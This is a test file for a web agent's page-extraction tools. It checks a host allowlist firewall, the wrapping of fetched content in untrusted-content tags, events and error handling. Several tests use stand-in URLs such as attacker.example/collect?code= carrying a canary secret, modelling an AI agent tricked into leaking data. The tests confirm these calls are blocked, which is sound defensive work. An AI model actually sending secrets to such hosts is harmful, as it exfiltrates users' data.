import { describe, it, expect, vi, beforeEach } from "vitest";
import { createTabstackTools } from "../../src/tools/tabstackTools.js";
import { SECURITY_BLOCKED_UNTRUSTED_NAVIGATION } from "../../src/security/actionFirewall.js";
import { WebAgentEventEmitter, WebAgentEventType } from "../../src/events.js";
import type Tabstack from "@tabstack/sdk";

// Mock the ai module
vi.mock("ai", () => ({
  tool: vi.fn((config: unknown) => {
    const typedConfig = config as {
      description: string;
      inputSchema: unknown;
      execute: (args: unknown, options?: unknown) => Promise<unknown>;
    };
    return {
      ...typedConfig,
      description: typedConfig.description,
      inputSchema: typedConfig.inputSchema,
      execute: typedConfig.execute,
    };
  }),
}));

function createMockClient() {
  return {
    extract: {
      markdown: vi.fn(),
      json: vi.fn(),
    },
    generate: {
      json: vi.fn(),
    },
  } as unknown as Tabstack;
}

const toolCallOptions = { toolCallId: "test", messages: [] } as any;

describe("Tabstack Tools", () => {
  let mockClient: Tabstack;
  let eventEmitter: WebAgentEventEmitter;
  let tools: ReturnType<typeof createTabstackTools>;

  beforeEach(() => {
    vi.clearAllMocks();
    mockClient = createMockClient();
    eventEmitter = new WebAgentEventEmitter();
    tools = createTabstackTools({
      client: mockClient,
      eventEmitter,
      // unsafe_mode so the existing extraction tests below aren't gated by host.
      firewall: { trustedHostnames: new Set<string>(), unsafeMode: true },
      interactive: false,
    });
  });

  describe("Firewall (destination allowlist)", () => {
    const SECRET = "CANARY-A1B2C3D9";
    function build(firewall: { trustedHostnames: Set<string>; unsafeMode: boolean }) {
      const client = createMockClient();
      (client.extract.markdown as any).mockResolvedValue({
        url: "https://trusted.example/x",
        content: "ok",
        metadata: {},
      });
      (client.extract.json as any).mockResolvedValue({ ok: true });
      (client.generate.json as any).mockResolvedValue({ ok: true });
      return {
        client,
        tools: createTabstackTools({
          client,
          eventEmitter: new WebAgentEventEmitter(),
          firewall,
          interactive: false,
        }),
      };
    }

    it("blocks a Tabstack fetch to an untrusted host", async () => {
      const { client, tools } = build({
        trustedHostnames: new Set(["trusted.example"]),
        unsafeMode: false,
      });
      const res: any = await tools.tabstack_extract_markdown.execute!(
        { url: `https://attacker.example/collect?code=${SECRET}` },
        toolCallOptions,
      );
      expect(res.success).toBe(false);
      expect(res.error).toBe(SECURITY_BLOCKED_UNTRUSTED_NAVIGATION);
      expect(client.extract.markdown).not.toHaveBeenCalled();
    });

    it("allows a Tabstack fetch to a trusted host", async () => {
      const { client, tools } = build({
        trustedHostnames: new Set(["trusted.example"]),
        unsafeMode: false,
      });
      const res: any = await tools.tabstack_extract_markdown.execute!(
        { url: "https://trusted.example/x" },
        toolCallOptions,
      );
      expect(res.success).toBe(true);
      expect(client.extract.markdown).toHaveBeenCalled();
    });

    it("allows any host in unsafe mode", async () => {
      const { client, tools } = build({ trustedHostnames: new Set<string>(), unsafeMode: true });
      const res: any = await tools.tabstack_extract_json.execute!(
        { url: "https://attacker.example/x", json_schema: {} },
        toolCallOptions,
      );
      expect(res.success).toBe(true);
      expect(client.extract.json).toHaveBeenCalled();
    });

    it("blocks tabstack_generate_json to an untrusted host", async () => {
      const { client, tools } = build({
        trustedHostnames: new Set(["trusted.example"]),
        unsafeMode: false,
      });
      const res: any = await tools.tabstack_generate_json.execute!(
        { url: `https://attacker.example/x?code=${SECRET}`, json_schema: {}, instructions: "x" },
        toolCallOptions,
      );
      expect(res.success).toBe(false);
      expect(res.error).toBe(SECURITY_BLOCKED_UNTRUSTED_NAVIGATION);
      expect(client.generate.json).not.toHaveBeenCalled();
    });
  });

  describe("Tool Structure", () => {
    it("should create all three tools", () => {
      expect(tools.tabstack_extract_markdown).toBeDefined();
      expect(tools.tabstack_extract_json).toBeDefined();
      expect(tools.tabstack_generate_json).toBeDefined();
    });

    it("should have descriptions mentioning key features", () => {
      expect(tools.tabstack_extract_markdown.description).toContain("PDF");
      expect(tools.tabstack_extract_json.description).toContain("JSON Schema");
      expect(tools.tabstack_generate_json.description).toContain("instructions");
    });
  });

  describe("tabstack_extract_markdown", () => {
    it("should call SDK with metadata: true and return result", async () => {
      const sdkResult = {
        url: "https://example.com",
        content: "# Hello",
        metadata: { title: "Hello" },
      };
      vi.mocked(mockClient.extract.markdown).mockResolvedValue(sdkResult);

      const result = (await tools.tabstack_extract_markdown.execute!(
        { url: "https://example.com" },
        toolCallOptions,
      )) as {
        success: boolean;
        action: string;
        url: string;
        content: string;
        metadata: unknown;
      };

      expect(mockClient.extract.markdown).toHaveBeenCalledWith({
        url: "https://example.com",
        metadata: true,
      });
      expect(result).toMatchObject({
        success: true,
        action: "tabstack_extract_markdown",
        url: "https://example.com",
        metadata: { title: "Hello" },
      });
      // Content is wrapped (asserted in detail below); the raw payload is preserved.
      expect(result.content).toContain("# Hello");
    });

    it('wraps content in <EXTERNAL-CONTENT label="tabstack-content"> with safety warning', async () => {
      vi.mocked(mockClient.extract.markdown).mockResolvedValue({
        url: "https://example.com",
        content: "raw page content from tabstack",
        metadata: { title: "Example" },
      });

      const result = (await tools.tabstack_extract_markdown.execute!(
        { url: "https://example.com" },
        toolCallOptions,
      )) as { success: boolean; content: string };

      expect(result.success).toBe(true);
      expect(result.content).toMatch(
        /<EXTERNAL-CONTENT label="tabstack-content">[\s\S]*<\/EXTERNAL-CONTENT>/,
      );
      expect(result.content).toContain("raw page content from tabstack");
      // Warning appears AFTER the closing tag, not just anywhere in the string.
      const closeIdx = result.content.indexOf("</EXTERNAL-CONTENT>");
      const warnIdx = result.content.indexOf("**IMPORTANT:**", closeIdx);
      expect(warnIdx).toBeGreaterThan(closeIdx);
    });

    it("should emit events on success", async () => {
      vi.mocked(mockClient.extract.markdown).mockResolvedValue({
        url: "https://example.com",
        content: "# Hello",
      });
      const emitSpy = vi.spyOn(eventEmitter, "emit");

      await tools.tabstack_extract_markdown.execute!(
        { url: "https://example.com" },
        toolCallOptions,
      );

      expect(emitSpy).toHaveBeenCalledWith(WebAgentEventType.AGENT_ACTION, {
        action: "tabstack_extract_markdown",
        value: "https://example.com",
      });
      expect(emitSpy).toHaveBeenCalledWith(WebAgentEventType.BROWSER_ACTION_COMPLETED, {
        success: true,
        action: "tabstack_extract_markdown",
      });
    });

    it("should handle errors gracefully", async () => {
      vi.mocked(mockClient.extract.markdown).mockRejectedValue(new Error("Fetch failed"));

      const result = await tools.tabstack_extract_markdown.execute!(
        { url: "https://example.com" },
        toolCallOptions,
      );

      expect(result).toEqual({
        success: false,
        action: "tabstack_extract_markdown",
        url: "https://example.com",
        error: "Fetch failed",
        isRecoverable: true,
      });
    });

    it("should emit failure event on error", async () => {
      vi.mocked(mockClient.extract.markdown).mockRejectedValue(new Error("Timeout"));
      const emitSpy = vi.spyOn(eventEmitter, "emit");

      await tools.tabstack_extract_markdown.execute!(
        { url: "https://example.com" },
        toolCallOptions,
      );

      expect(emitSpy).toHaveBeenCalledWith(WebAgentEventType.BROWSER_ACTION_COMPLETED, {
        success: false,
        action: "tabstack_extract_markdown",
        error: "Timeout",
        isRecoverable: true,
      });
    });

    it("should handle non-Error exceptions", async () => {
      vi.mocked(mockClient.extract.markdown).mockRejectedValue("string error");

      const result = await tools.tabstack_extract_markdown.execute!(
        { url: "https://example.com" },
        toolCallOptions,
      );

      expect(result).toMatchObject({
        success: false,
        error: "string error",
      });
    });
  });

  describe("tabstack_extract_json", () => {
    const schema = {
      type: "object",
      properties: { title: { type: "string" } },
    };

    it("should call SDK with url and json_schema and return data", async () => {
      const sdkResult = { title: "Hello World" };
      vi.mocked(mockClient.extract.json).mockResolvedValue(sdkResult);

      const result = await tools.tabstack_extract_json.execute!(
        { url: "https://example.com", json_schema: schema },
        toolCallOptions,
      );

      expect(mockClient.extract.json).toHaveBeenCalledWith({
        url: "https://example.com",
        json_schema: schema,
      });
      expect(result).toEqual({
        success: true,
        action: "tabstack_extract_json",
        url: "https://example.com",
        data: { title: "Hello World" },
      });
    });

    it("should handle errors gracefully", async () => {
      vi.mocked(mockClient.extract.json).mockRejectedValue(new Error("Invalid schema"));

      const result = await tools.tabstack_extract_json.execute!(
        { url: "https://example.com", json_schema: schema },
        toolCallOptions,
      );

      expect(result).toEqual({
        success: false,
        action: "tabstack_extract_json",
        url: "https://example.com",
        error: "Invalid schema",
        isRecoverable: true,
      });
    });
  });

  describe("tabstack_generate_json", () => {
    const schema = {
      type: "object",
      properties: { summary: { type: "string" } },
    };

    it("should call SDK with url, json_schema, and instructions", async () => {
      const sdkResult = { summary: "A brief summary" };
      vi.mocked(mockClient.generate.json).mockResolvedValue(sdkResult);

      const result = await tools.tabstack_generate_json.execute!(
        {
          url: "https://example.com",
          json_schema: schema,
          instructions: "Summarize the page",
        },
        toolCallOptions,
      );

      expect(mockClient.generate.json).toHaveBeenCalledWith({
        url: "https://example.com",
        json_schema: schema,
        instructions: "Summarize the page",
      });
      expect(result).toEqual({
        success: true,
        action: "tabstack_generate_json",
        url: "https://example.com",
        data: { summary: "A brief summary" },
      });
    });

    it("should handle errors gracefully", async () => {
      vi.mocked(mockClient.generate.json).mockRejectedValue(new Error("Transform failed"));

      const result = await tools.tabstack_generate_json.execute!(
        {
          url: "https://example.com",
          json_schema: schema,
          instructions: "Summarize",
        },
        toolCallOptions,
      );

      expect(result).toEqual({
        success: false,
        action: "tabstack_generate_json",
        url: "https://example.com",
        error: "Transform failed",
        isRecoverable: true,
      });
    });

    it("should emit events on success", async () => {
      vi.mocked(mockClient.generate.json).mockResolvedValue({ summary: "test" });
      const emitSpy = vi.spyOn(eventEmitter, "emit");

      await tools.tabstack_generate_json.execute!(
        {
          url: "https://example.com",
          json_schema: schema,
          instructions: "Summarize",
        },
        toolCallOptions,
      );

      expect(emitSpy).toHaveBeenCalledWith(WebAgentEventType.AGENT_ACTION, {
        action: "tabstack_generate_json",
        value: "https://example.com",
      });
      expect(emitSpy).toHaveBeenCalledWith(WebAgentEventType.BROWSER_ACTION_COMPLETED, {
        success: true,
        action: "tabstack_generate_json",
      });
    });
  });
});
